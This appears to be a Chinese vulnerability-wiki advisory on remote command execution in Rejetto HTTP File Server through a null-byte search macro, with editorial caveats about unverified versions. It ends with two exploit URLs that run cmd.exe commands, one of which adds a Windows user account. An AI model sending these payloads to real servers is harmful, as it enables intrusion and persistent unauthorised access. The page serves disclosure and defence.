---
source: "hatch 补库批 20260928"
title: "Hfs 远程命令执行漏洞"
product: "Rejetto HTTP File Server"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "旧HFS搜索宏处理，Windows命令执行权限由服务账户决定"
source_status: "unknown"
side_effects: "含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
id: "vw-3894e4d39c1ef83026ae4be2"
entity_id: "ve-3894e4d39c1ef83026ae4be2"
schema_version: "1"
---

# Hfs 远程命令执行漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：旧HFS搜索宏处理，Windows命令执行权限由服务账户决定
- 证据范围：两个URL无响应；版本先2.3c及之前后又2.3c以前，边界不一致

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 应核对官方CVE/修复版本，不与2024-23692仅凭HFS名称合并
- search==额外等号及URL未编码空格需说明
- 第二请求创建用户有状态，不能当纯检测

### 操作风险与资料使用

- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

一、漏洞简介
------------

Rejetto HTTP File Server
2.3c及之前版本中的parserLib.pas文件中的'findMacroMarker'函数中存在安全漏洞，该漏洞源于parserLib.pas文件没有正确处理空字节。远程攻击者可借助搜索操作中的'%00'序列利用该漏洞执行任意程序。

二、漏洞影响
------------

2.3c以前的2.3x版本

三、复现过程
------------

    http://www.0-sec.org:8080/?search==%00{.exec|cmd.exe /c [Command-String].}
    http://www.0-sec.org:8080/?search==%00{.exec|cmd.exe /c net user test1234 1234 /add.}
